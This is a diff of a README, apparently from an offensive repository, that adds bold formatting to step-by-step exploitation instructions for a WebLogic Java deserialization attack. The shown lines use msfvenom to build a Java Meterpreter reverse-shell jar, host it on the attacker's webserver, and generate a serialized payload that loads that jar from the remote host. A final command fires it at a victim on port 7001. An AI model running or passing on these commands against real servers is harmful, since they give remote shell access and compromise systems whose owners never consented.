@@ -65,16 +65,16 @@ Set that **MSF handler** running ->
 ` set LPORT 1234 `
 ` exploit -j `
 
-Create a malicious Java Meterpreter ->
+Create a malicious **Java Meterpreter** ->
 `msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f jar > my_reverse_meterpreter.jar`
 
-Host that bad boy on your webserver, make sure that the victim will be able to access this ->
+Host that bad boy on your **webserver**, make sure that the victim will be able to access this ->
 ` mv ./my_reverse_meterpreter.jar /var/www/html/`
 ` service apache2 start` <- Or whatever HTTP Server you prefer :)
 
-Generate your malicious servlet ->
+Generate your malicious **servlet** ->
 ` java -jar exserial.jar ClassInject "http://yourwebserver:port/my_reverse_meterpreter.jar" "metasploit.Payload" > exploit.ser`
 
-Fire away and pray for shells ->
+Fire away and **pray for shells** ->
 ` python scripts/weblogic.py http://somepoorsod:7001 exploit.ser`
 
